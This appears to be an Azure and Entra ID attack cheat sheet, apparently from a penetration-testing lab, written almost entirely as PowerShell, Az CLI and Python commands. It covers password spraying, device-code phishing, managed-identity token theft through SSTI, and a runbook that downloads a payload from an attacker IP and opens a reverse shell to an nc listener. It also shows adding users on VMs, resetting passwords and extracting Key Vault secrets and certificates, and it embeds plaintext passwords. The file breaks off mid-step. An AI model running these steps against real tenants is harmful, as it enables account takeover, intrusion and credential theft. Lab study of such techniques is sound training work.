# ============================================================
# CONNECT
# ============================================================

$passwd = ConvertTo-SecureString "NewUserSSecret@Pass61" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential(
    "AS-5945632460@oilcorptarsands.onmicrosoft.com",
    $passwd
)
Connect-AzAccount -Credential $creds
Connect-MgGraph `
    -ClientSecretCredential $creds `
    -TenantId bcdc6c96-4f80-4b10-8228-2e6477c71851

# ============================================================
# 1. UNAUTHENTICATED RECON
# ============================================================

# Get if Azure tenant is in use, tenant name and federation
# https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1

# Get the Tenant ID
# https://login.microsoftonline.com/[DOMAIN]/.well-known/openid-configuration

# Validate Email ID
# https://login.microsoftonline.com/common/GetCredentialType

Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose

# Get tenant name, authentication, brand name and domain name
Get-AADIntLoginInformation -UserName User8829957150027433301@defcorpspace.onmicrosoft.com

# Get tenant ID
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com

# Get tenant domains
Get-AADIntTenantDomains -Domain defcorphq.onmicrosoft.com
Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
Get-AADIntTenantDomains -Domain microsoft.com

# Get all the information
Invoke-AADIntReconAsOutsider -DomainName defcorpplanetary.onmicrosoft.com

# Validate emails
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt

# MicroBurst: open services
Import-Module .\MicroBurst\MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -base defcorpspace -Verbose
Invoke-EnumerateAzureBlobs -base defcorpspace -Verbose

# Password spray
. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
Invoke-MSOLSpray `
    -UserList .\emails.txt `
    -Password V3ryH4rdt0Cr4ckN0OneC@nGu355ForT3stUs3r `
    -Verbose

# ============================================================
# 2. AUTHENTICATED RECON
# ============================================================

# ============================================================
# 2.1 MICROSOFT GRAPH (replaces deprecated AzureAD module)
# ============================================================

# Install if needed:
# Install-Module Microsoft.Graph -Scope CurrentUser

Connect-MgGraph -Scopes `
    "User.Read.All",
    "Group.Read.All",
    "Directory.Read.All",
    "RoleManagement.Read.Directory",
    "Device.Read.All",
    "Application.Read.All",
    "Policy.Read.All",
    "UserAuthenticationMethod.ReadWrite.All"

# --- Session info ---
Get-MgContext

# ---- Users ----

# Get current signed-in user
$currentUser = Get-MgUser -UserId (Get-MgContext).Account

# Get all users
Get-MgUser -All

# Get UPNs only
Get-MgUser -All | Select-Object UserPrincipalName

# Get global admins
$globalAdminRole = Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'"
Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id | fl

# Get a specific user
Get-MgUser -UserId test@defcorphq.onmicrosoft.com

# Search by display name prefix
Get-MgUser -Search '"displayName:admin"' -ConsistencyLevel eventual

# Search for "admin" anywhere in display name
Get-MgUser -All | Where-Object { $_.DisplayName -match "admin" }

# Search all user properties for the string "password"
Get-MgUser -All -Property * | ForEach-Object {
    $u = $_
    $u.PSObject.Properties | ForEach-Object {
        if ($_.Value -match 'password') {
            "$($u.UserPrincipalName) - $($_.Name) - $($_.Value)"
        }
    }
}

# Users synced from on-prem
Get-MgUser -All | Where-Object { $_.OnPremisesSecurityIdentifier -ne $null }

# Users from Azure AD only
Get-MgUser -All | Where-Object { $_.OnPremisesSecurityIdentifier -eq $null }

# Objects owned by a specific user
Get-MgUserOwnedObject -UserId test@defcorphq.onmicrosoft.com

# Objects created by a specific user
Get-MgUserCreatedObject -UserId test@defcorphq.onmicrosoft.com

# Get current user's group memberships
Get-MgUserMemberOf -UserId $currentUser.Id

# Get roles assigned to current user
Get-MgUserMemberOf -UserId $currentUser.Id |
    Where-Object { $_.AdditionalProperties.'@odata.type' -eq '#microsoft.graph.directoryRole' }

# ---- Groups ----

# Get all groups
Get-MgGroup -All

# Get groups synced from on-prem
Get-MgGroup -All | Where-Object { $_.OnPremisesSecurityIdentifier -ne $null }

# Search for groups by name
Get-MgGroup -Search '"displayName:admin"' -ConsistencyLevel eventual

# Get members of a specific group
Get-MgGroupMember -GroupId 783a312d-0de2-4490-92e4-539b0e4ee03e

# Get groups and roles a user belongs to
Get-MgUserMemberOf -UserId test@defcorphq.onmicrosoft.com

# ---- Roles ----

# Get all role templates
Get-MgDirectoryRoleTemplate

# Get all enabled roles
Get-MgDirectoryRole

# Get members of a specific role
$globalAdminRole = Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'"
Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id

# Get all custom (non-built-in) role definitions
Get-MgRoleManagementDirectoryRoleDefinition -All |
    Where-Object { $_.IsBuiltIn -eq $false }

# ---- Devices ----

# Get all devices
Get-MgDevice -All

# Get only active (non-stale) devices
Get-MgDevice -All | Where-Object { $_.ApproximateLastSignInDateTime -ne $null }

# Get registered owners of all devices
Get-MgDevice -All | ForEach-Object {
    $device = $_
    $owners = Get-MgDeviceRegisteredOwner -DeviceId $device.Id
    if ($owners) {
        $device
        $owners | Select-Object -ExpandProperty AdditionalProperties |
            ForEach-Object { $_['userPrincipalName'] }
        "`n"
    }
}

# Get registered users of all devices
Get-MgDevice -All | ForEach-Object {
    $device = $_
    $users = Get-MgDeviceRegisteredUser -DeviceId $device.Id
    if ($users) {
        $device
        $users | Select-Object -ExpandProperty AdditionalProperties |
            ForEach-Object { $_['userPrincipalName'] }
        "`n"
    }
}

# Get devices owned by a specific user
Get-MgUserOwnedDevice -UserId michaelmbarron@defcorphq.onmicrosoft.com

# Get devices registered by a specific user
Get-MgUserRegisteredDevice -UserId michaelmbarron@defcorphq.onmicrosoft.com

# Get Intune-managed (compliant) devices
Get-MgDevice -All | Where-Object { $_.IsCompliant -eq $true }

# ---- Applications ----

# Get all app registrations
Get-MgApplication -All

# Get all details about a specific application
Get-MgApplication -ApplicationId a1333e88-1278-41bf-8145-155a069ebed0

# Filter apps by display name
Get-MgApplication -All | Where-Object { $_.DisplayName -match "app" }

# List apps that have password credentials
Get-MgApplication -All | Where-Object { $_.PasswordCredentials.Count -gt 0 }

# List apps that have key (certificate) credentials
Get-MgApplication -All | Where-Object { $_.KeyCredentials.Count -gt 0 }

# Get owner of an application
Get-MgApplicationOwner -ApplicationId a1333e88-1278-41bf-8145-155a069ebed0

# Get apps where a user has a role assignment
Get-MgUserAppRoleAssignment -UserId roygcain@defcorphq.onmicrosoft.com

# Get apps where a group has a role assignment
Get-MgGroupAppRoleAssignment -GroupId 57ada729-a581-4d6f-9f16-3fe0961ada82

# Detailed app + group members dump
Get-MgApplication -All | ForEach-Object {
    $_ | Format-List *
    Write-Output "-----------------------"
}

Get-MgUserMemberOf -UserId $currentUser.Id | ForEach-Object {
    $_ | Format-List *
    Write-Output "-----------Members------------"
    Get-MgGroupMember -GroupId $_.Id | Format-List *
    Write-Output "-----------------------"
}

# Less detailed group + members dump
Get-MgGroup -All | ForEach-Object {
    $_ | Format-List *
    Write-Output "-----------Members------------"
    Get-MgGroupMember -GroupId $_.Id
    Write-Output "-----------------------"
}

# More detailed group + members dump
Get-MgGroup -All | ForEach-Object {
    $_ | Format-List *
    Write-Output "-----------Members------------"
    Get-MgGroupMember -GroupId $_.Id | Format-List *
    Write-Output "-----------------------"
}

# ---- Service Principals / Enterprise Apps ----

# Get all service principals
Get-MgServicePrincipal -All

# Get details about a specific service principal
Get-MgServicePrincipal -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264

# Filter SPs by display name
Get-MgServicePrincipal -All | Where-Object { $_.DisplayName -match "app" }

# List SPs with password credentials
Get-MgServicePrincipal -All | Where-Object { $_.PasswordCredentials.Count -gt 0 }

# List SPs with key/certificate credentials
Get-MgServicePrincipal -All | Where-Object { $_.KeyCredentials.Count -gt 0 }

# Get owner of a service principal
Get-MgServicePrincipalOwner -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264

# Get objects owned by a service principal
Get-MgServicePrincipalOwnedObject -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264

# Get objects created by a service principal
Get-MgServicePrincipalCreatedObject -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264

# Get group and role memberships of a service principal
Get-MgServicePrincipalMemberOf -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264

# ============================================================
# 2.2 AZ POWERSHELL MODULE
# ============================================================

Connect-AzAccount

# Get current context
Get-AzContext

# List all available contexts
Get-AzContext -ListAvailable

# Enumerate subscriptions
Get-AzSubscription

# Enumerate all visible resources
Get-AzResource

# Enumerate all RBAC role assignments
Get-AzRoleAssignment

# ---- Users ----

Get-AzADUser
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
Get-AzADUser -SearchString "admin"
Get-AzADUser | Where-Object { $_.DisplayName -match "admin" }

# Get role assignments for a user (outbound roles)
Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com

# ---- Groups ----

Get-AzADGroup
Get-AzADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
Get-AzADGroup -SearchString "admin" | Format-List *
Get-AzADGroup | Where-Object { $_.DisplayName -match "admin" }
Get-AzADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e

# ---- Apps ----

Get-AzADApplication
Get-AzADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0
Get-AzADApplication | Where-Object { $_.DisplayName -match "app" }

# Get web app services (excluding function apps)
Get-AzWebApp | Where-Object { $_.Kind -notmatch "functionapp" }

# List apps with password credentials
Get-AzADApplication | ForEach-Object {
    if (Get-AzADAppCredential -ObjectId $_.Id) { $_ }
}

# Function apps
Get-AzFunctionApp

# Storage accounts
Get-AzStorageAccount | Format-List

# Key vaults
Get-AzKeyVault

# ---- Service Principals ----

Get-AzADServicePrincipal
Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264
Get-AzADServicePrincipal | Where-Object { $_.DisplayName -match "app" }

# ============================================================
# 2.3 AZ CLI
# ============================================================

az login
# If user has no subscription permissions:
az login `
    -u User8829957150027433301@defcorpspace.onmicrosoft.com `
    -p '[C@d8e6b6' `
    --allow-no-subscriptions

az configure

# Find popular commands for VMs
az find "vm"

# Tenant and subscription info
az account tenant list
az account subscription list

# Current signed-in user (whoami)
az ad signed-in-user show

# ---- Users ----

az ad user list
az ad user list --query "[].[displayName]" -o table
az ad user show --id test@defcorphq.onmicrosoft.com
az ad user list --query "[?contains(displayName,'admin')].displayName"

# Case-insensitive search (PowerShell pipe)
az ad user list | ConvertFrom-Json | Where-Object { $_.displayName -match "admin" }

# On-prem synced users
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"

# Azure AD-only users
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"

# UPN + DisplayName table
az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table

# ---- Groups ----

az ad group list
az ad group list --query "[].[displayName]" -o table
az ad group show -g "VM Admins"
az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e

# Case-insensitive search
az ad group list | ConvertFrom-Json | Where-Object { $_.displayName -match "admin" }

# On-prem groups
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"

# Azure AD-only groups
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"

# Group members
az ad group member list -g "VM Admins" --query "[].[displayName]" -o table

# Check if user is member of group
az ad group member check `
    --group "VM Admins" `
    --member-id b71d21f6-8e09-4a9d-932a-cb73df519787

# Get groups of which a group is a member
az ad group get-member-groups -g "VM Admins"

# ---- VMs and Web Apps ----

az vm list
az vm list --query "[].[name]" -o table
az vm list -o table
az webapp list
az functionapp list --query "[].[name]" -o table

# Network interface name for a specific VM
az vm nic list --vm-name bkpadconnect --resource-group ENGINEERING

# ---- App Registrations ----

az ad app list
az ad app list --query "[].[displayName]" -o table
az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0
az ad app list --query "[?contains(displayName,'app')].displayName"

# Case-insensitive search
az ad app list | ConvertFrom-Json | Where-Object { $_.displayName -match "slack" }

# Get owner of an application
az ad app owner list `
    --id a1333e88-1278-41bf-8145-155a069ebed0 `
    --query "[].[displayName]" -o table

# Apps with password credentials
az ad app list --query "[?passwordCredentials !=null].displayName"

# Apps with key/certificate credentials
az ad app list --query "[?keyCredentials !=null].displayName"

# ---- Service Principals ----

az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table
az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264
az ad sp list --all --query "[?contains(displayName,'app')].displayName"

# Case-insensitive search
az ad sp list --all | ConvertFrom-Json | Where-Object { $_.displayName -match "app" }

# Get owner of SP
az ad sp owner list `
    --id cdddd16e-2611-4442-8f45-053e7c37a264 `
    --query "[].[displayName]" -o table

# SPs owned by current user
az ad sp list --show-mine

# SPs with password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"

# SPs with key/certificate credentials
az ad sp list --all --query "[?keyCredentials != null].displayName"

# ============================================================
# TOKEN USAGE — REST API
# ============================================================

# Enumerate users with AT from phishing/consent grant attack
$URI = 'https://graph.microsoft.com/v1.0/users'
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $Token" }
}
(Invoke-RestMethod @RequestParams).value

# Get subscriptions using ARM token (e.g. from Managed Identity token riding)
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $Token" }
}
(Invoke-RestMethod @RequestParams).value

# List all resources in a subscription
$URI = 'https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resources?api-version=2020-10-01'
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $Token" }
}
(Invoke-RestMethod @RequestParams).value | Format-List

# List permissions on a specific resource (2015 API)
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/5e4a7f52-ddf6-422b-8aaf-161e342398d6/resourceGroups/AS-hmvxqpuyzl3343455/providers/Microsoft.KeyVault/vaults/asegfdnurqpj3343460/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $Token" }
}
(Invoke-RestMethod @RequestParams).value | Format-List

# List permissions on a specific resource (2022 API — more results)
$KeyVault          = Get-AzKeyVault
$SubscriptionID    = (Get-AzSubscription).Id
$ResourceGroupName = $KeyVault.ResourceGroupName
$KeyVaultName      = $KeyVault.VaultName
$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.KeyVault/vaults/$KeyVaultName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $Access_Token" }
}
$Permissions = (Invoke-RestMethod @RequestParams).value
$Permissions | Format-List *

# Get apps accessible to MI via Graph token
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $graphToken" }
}
(Invoke-RestMethod @RequestParams).value

# Retrieve MI tokens via IDENTITY_ENDPOINT (e.g. from SSTI/code exec in App Service)
# ARM token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" `
    -H secret:$IDENTITY_HEADER

# Key Vault token
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" `
    -H secret:$IDENTITY_HEADER

# Python version (e.g. from Flask SSTI)
import os, json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER   = os.environ['IDENTITY_HEADER']

for resource, label in [
    ("https://management.azure.com/", "Management API"),
    ("https://graph.microsoft.com/",  "Graph API"),
]:
    val = os.popen(
        f'curl "{IDENTITY_ENDPOINT}?resource={resource}&api-version=2017-09-01"'
        f' -H secret:{IDENTITY_HEADER}'
    ).read()
    data = json.loads(val)
    print(f"\n[+] {label}")
    print("Access Token:", data["access_token"])
    print("ClientID:",     data["client_id"])

# Get AAD Graph token (used by AzureAD PS module)
az account get-access-token --resource-type aad-graph

# Get ARM token
az account get-access-token

# Ride existing tokens
Connect-AzAccount `
    -AccessToken      $Token `
    -GraphAccessToken $graphToken `
    -AccountId        62e44426-5c46-4e3c-8a89-f461d5d586f2

# ============================================================
# LATERAL MOVEMENT — AUTOMATION RUNBOOK
# ============================================================

# rev_shell.ps1 content:
# iex (New-Object Net.Webclient).downloadstring('http://172.16.150.17:82/InvokePowerShellTcp.ps1')
# Power -Reverse -IPAddress 172.16.150.17 -Port 4448

Import-AzAutomationRunbook `
    -Name                student17 `
    -Path                C:\AzAD\Tools\rev_shell_17.ps1 `
    -AutomationAccountName HybridAutomation `
    -ResourceGroupName   Engineering `
    -Type                PowerShell `
    -LogVerbose          $true `
    -LogProgress         $true `
    -Force

Publish-AzAutomationRunbook `
    -RunbookName           student17 `
    -AutomationAccountName HybridAutomation `
    -ResourceGroupName     Engineering `
    -Verbose

# Start listener before running
# nc -nvlp 4448

Start-AzAutomationRunbook `
    -RunbookName           student17 `
    -RunOn                 Workergroup1 `
    -AutomationAccountName HybridAutomation `
    -ResourceGroupName     Engineering `
    -Verbose `
    -Wait

# Troubleshoot job output
Get-AzAutomationJobOutput `
    -Id                    <job_id> `
    -ResourceGroupName     Engineering `
    -AutomationAccountName HybridAutomation `
    -Stream                "Any"

# Export a runbook
Export-AzAutomationRunbook `
    -Name                  ManageAWS `
    -AutomationAccountName ManageMultiCloud `
    -ResourceGroupName     Refining `
    -Slot                  Published `
    -OutputFolder          C:\AzAD\Tools\

# Read runbook job output via REST
$JobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"
$URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/jobs/$JobId/output?api-version=2023-11-01"
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $accesstoken" }
}
Invoke-RestMethod @RequestParams

# Get permissions on automation account
$URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $accesstoken" }
}
$Permissions = (Invoke-RestMethod @RequestParams).value
$Permissions | Format-List *
$Permissions.actions | Format-List *

# ============================================================
# CODE EXECUTION ON VM
# ============================================================

# Run script on VM
Invoke-AzVMRunCommand `
    -VMName            bkpadconnect `
    -ResourceGroupName Engineering `
    -CommandId         'RunPowerShellScript' `
    -ScriptPath        'C:\AzAD\Tools\adduser.ps1' `
    -Verbose

# Get VM public IP
# 1. Get interface name
Get-AzVM -Name infradminsrv -ResourceGroupName Research |
    Select-Object -ExpandProperty NetworkProfile

# 2. Get the public IP object name (interface name from previous output)
Get-AzNetworkInterface -Name bkpadconnect368

# 3. Get the actual public IP (IP object name from previous output)
Get-AzPublicIpAddress -Name bkpadconnectIP
# Value is in the IpAddress field

# ---- WinRM / PSSession ----

# Add local user via RunCommand first (adduser.ps1)
Invoke-AzVMRunCommand `
    -VMName            bkpadconnect `
    -ResourceGroupName Engineering `
    -CommandId         'RunPowerShellScript' `
    -ScriptPath        'C:\AzAD\Tools\adduser.ps1' `
    -Verbose

$password = ConvertTo-SecureString 'Stud17Password@123' -AsPlainText -Force
$creds    = New-Object System.Management.Automation.PSCredential('student17', $password)
$sess     = New-PSSession `
    -ComputerName     10.0.1.5 `
    -Credential       $creds `
    -SessionOption    (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess

# NOTE: If auth fails, prefix username with .\ to specify local account:
$creds        = New-Object System.Management.Automation.PSCredential('.\student17', $password)
$infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds

# ============================================================
# KEY VAULT
# ============================================================

# Key Vault can be enumerated with ARM token only,
# but reading secrets requires a Key Vault-scoped token.

# Request Key Vault token from MI endpoint
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" `
    -H secret:$IDENTITY_HEADER

# Request ARM token from MI endpoint
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" `
    -H secret:$IDENTITY_HEADER

# Connect with both tokens
Connect-AzAccount `
    -AccessToken         $MIARMAT `
    -KeyVaultAccessToken $MIKVAT `
    -AccountId           2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc

# List secrets in a vault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault

# Read a secret value
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText

# ============================================================
# CUSTOM ROLES AND GROUPS
# ============================================================

# List all role assignments
Get-AzRoleAssignment

# Get definition of a custom role
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

# Get a specific group
Get-AzADGroup -DisplayName 'VM Admins'

# Get group members
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | Select-Object DisplayName

# List roles and groups a user is member of (requires MS Graph token)
$Token = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URI   = 'https://graph.microsoft.com/v1.0/users/student17@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $Token" }
}
(Invoke-RestMethod @RequestParams).value

# ---- Administrative Units ----

# Get an administrative unit by ID
Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395

# Get members of an administrative unit
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395

# Get scoped role memberships (who has a role over AU members)
Get-MgDirectoryAdministrativeUnitScopedRoleMember `
    -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395 | Format-List

# Reset a user's password
$passwordProfile = @{
    forceChangePasswordNextSignIn = $false
    password                      = 'NewUserSSecret@Pass61'
}
Update-MgUser `
    -UserId          AS-5945632460@oilcorptarsands.onmicrosoft.com `
    -PasswordProfile $passwordProfile

# ---- Application Proxy ----

# Enumerate all apps with Application Proxy configured (still requires AzureAD or Graph Beta)
# Install-Module Microsoft.Graph.Beta -Scope CurrentUser
Get-MgBetaApplication | ForEach-Object {
    try {
        Get-MgBetaApplicationOnPremisesPublishing -ApplicationId $_.Id
        $_.DisplayName
        $_.Id
    } catch {}
}

# Check users/groups with access to an App Proxy app
$sp = Get-MgServicePrincipal -Filter "DisplayName eq 'Finance Management System'"
Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $sp.Id | Format-List

# ============================================================
# DEVICE CODE PHISHING (TokenTactics)
# ============================================================

Import-Module C:\AzAD\Tools\TokenTactics-main\TokenTactics.psd1
Get-AzureToken -Client MSGraph

# After the victim authenticates, grab the access token:
$response.access_token

# If the access token expires, refresh using:
Invoke-RefreshGraphTokens `
    -refreshToken $response.refresh_token `
    -tenantid     d6bd5a42-7c65-421c-ad23-a25a5d5fa57f

# FOCI — get MS Graph AT from refresh token
$GraphAT = (Invoke-RefreshToMSGraphToken `
    -domain       oilcorporation.onmicrosoft.com `
    -refreshToken $tokens.refresh_token).access_token

# ============================================================
# APPLICATIONS — SECRETS / CERTS ENUM + SAVE
# ============================================================

$GraphAccessToken = $AccessToken
$URI = "https://graph.microsoft.com/v1.0/Applications"
$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{ 'Authorization' = "Bearer $GraphAccessToken" }
}
$Applications = (Invoke-RestMethod @RequestParams).value

$ApplicationsDetails = [PSCustomObject]@{ Applications = @() }
foreach ($Application in $Applications) {
    $ApplicationsDetails.Applications += [PSCustomObject]@{
        DisplayName         = $Application.displayName
        AppId               = $Application.appId
        CreatedDateTime     = $Application.createdDateTime
        ID                  = $Application.id
        keyCredentials      = $Application.keyCredentials
        passwordCredentials = $Application.passwordCredentials
    }
}
$ApplicationsDetails.Applications
$ApplicationsDetails.Applications | Export-Clixml -Path C:\AzAD\Tools\OilCorpApplications.xml

# ---- Match cert from Key Vault to app ----

$secret      = Get-AzKeyVaultSecret -VaultName GISAppvault -Name GISAppCert -AsPlainText
$secretByte  = [Convert]::FromBase64String($secret)
[System.IO.File]::WriteAllBytes("C:\AzAD\Tools\StorageCert.pfx", $secretByte)

$clientCertificate = New-Object `
    System.Security.Cryptography.X509Certificates.X509Certificate2 `
    -ArgumentList 'C:\AzAD\Tools\StorageCert.pfx'

Import-Clixml C:\AzAD\Tools\OilCorpApplications.xml |
    Where-Object { $_.keyCredentials.customKeyIdentifier -eq $clientCertificate.Thumbprint }

# ============================================================
# KEY VAULT — REFRESH TOKEN EXCHANGE
# ============================================================

$scope         = 'https://vault.azure.net/.default'
$refresh_token = $tokens.refresh_token
$body = @{
    client_id     = $ClientID
    scope         = $scope
    refresh_token = $refresh_token
    grant_type    = 'refresh_token'
}
$KeyVaultAccessToken = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri    "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
    -Body   $body
$KeyVaultAccessToken

# Connect with ARM + Key Vault tokens
Connect-AzAccount `
    -AccessToken         $accesstoken `
    -KeyVaultAccessToken $KeyVaultAccessToken.access_token `
    -AccountId           ThomasLWright@oilcorporation.onmicrosoft.com

# Get Key Vault certificate and write to disk
Get-AzKeyVaultCertificate -VaultName GISAppvault
$secret     = Get-AzKeyVaultSecret -VaultName GISAppvault -Name GISAppCert -AsPlainText
$secretByte = [Convert]::FromBase64String($secret)
[System.IO.File]::WriteAllBytes("C:\AzAD\Tools\GISAppcert.pfx", $secretByte)

# ============================================================
# AUTHENTICATE WITH CERT + GET TOKENS
# ============================================================

. .\New-AccessToken.ps1

$secret     = Get-Content .\CertificateBase64.txt
$secretByte = [Convert]::FromBase64String($secret)
[System.IO.File]::WriteAllBytes("C:\AzAD\Tools\StorageCert.pfx", $secretByte)

$clientCertificate = New-Object `
    System.Security.Cryptography.X509Certificates.X509Certificate2 `
    -ArgumentList 'C:\AzAD\Tools\StorageCert.pfx'

$StorageToken = New-AccessToken `
    -clientCertificate $clientCertificate `
    -tenantID          2e0d024c-5e44-47f7-b4b8-42126b542e36 `
    -appID             578e381a-8f03-4cae-8b3e-559d02023ee1 `
    -scope             'https://management.azure.com/.default'

$GraphToken = New-AccessToken `
    -clientCertificate $clientCertificate `
    -tenantID          2e0d024c-5e44-47f7-b4b8-42126b542e36 `
    -appID             578e381a-8f03-4cae-8b3e-559d02023ee1 `
    -scope             'https://graph.microsoft.com/.default'

$AadToken = New-AccessToken `
    -clientCertificate $clientCertificate `
    -tenantID          2e0d024c-5e44-47f7-b4b8-42126b542e36 `
    -appID             578e381a-8f03-4cae-8b3e-559d02023ee1 `
    -scope             'https://graph.windows.net/.default'

Connect-AzAccount `
    -AccessToken $StorageToken `
    -AccountId   578e381a-8f03-4cae-8b3e-559d02023ee1

[X509Certificate]$clientCertificate2 = Get-PfxCertificate -FilePath C:\AzAD\Tools\StorageCert.pfx

Connect-MgGraph `
    -Certificate $clientCertificate2 `
    -ClientId    578e381a-8f03-4cae-8b3e-559d02023ee1 `
    -TenantId    2e0d024c-5e44-47f7-b4b8-42126b542e36

# ============================================================
# KEY VAULT — CERT METADATA + JWT SIGNING
# ============================================================

# Get Key Vault cert metadata (API v7.4)
$URI = "https://asegfdnurqpj3343460.vault.azure.net/certificates?api-version=7.4"
$RequestParams = @{
    Method      = 'GET'
    Uri         = $URI
    Headers     = @{ 'Authorization' = "Bearer $KVAT" }
    ContentType = "application/json"
}
$KVInfo = (Invoke-RestMethod @RequestParams).value
$KVInfo | Format-List *

# Get vault cert metadata (detailed, API v7.3)
function Get-AKVCertificate {
    param($kvURI, $GISAppKeyVaultToken, $keyName)

    $uri          = "$kvURI/certificates?api-version=7.3"
    $httpResponse = Invoke-WebRequest -Uri $uri -Headers @{
        'Authorization' = "Bearer $GISAppKeyVaultToken"
    }
    $certs   = $httpResponse.Content | ConvertFrom-Json
    $certUri = $certs.Value | Where-Object { $_.id -like "*$keyName*" }
    Write-Output $certUri

    $httpResponse = Invoke-WebRequest -Uri "$($certUri.id)?api-version=7.3" -Headers @{
        'Authorization' = "Bearer $KVAT"
    }
    return $httpResponse.Content | ConvertFrom-Json
}

$AKVCertificate = Get-AKVCertificate `
    -kvURI              'https://asegfdnurqpj3343460.vault.azure.net' `
    -GISAppKeyVaultToken $KVAT `
    -keyName            'AS-lsguyqwnaj3343458'
$AKVCertificate | Format-List *

# ---- Build and sign JWT using AKV cert, then request ARM token ----
# Reference: https://www.huntandhackett.com/blog/researching-access-tokens-for-fun-and-knowledge

$DataAnalyticsAppID = 'f23a808b-6a01-4fb2-bfd9-bdb3e8390421'
$tenantID           = 'd6bd5a42-7c65-421c-ad23-a25a5d5fa57f'
$audience           = "https://login.microsoftonline.com/$tenantID/oauth2/token"

$startDate              = (Get-Date "1970-01-01T00:00:00Z").ToUniversalTime()
$JWTExpirationTimeSpan  = (New-TimeSpan -Start $startDate -End (Get-Date).ToUniversalTime().AddMinutes(2)).TotalSeconds
$JWTExpiration          = [math]::Round($JWTExpirationTimeSpan, 0)
$NotBeforeTimeSpan      = (New-TimeSpan -Start $startDate -End (Get-Date).ToUniversalTime()).TotalSeconds
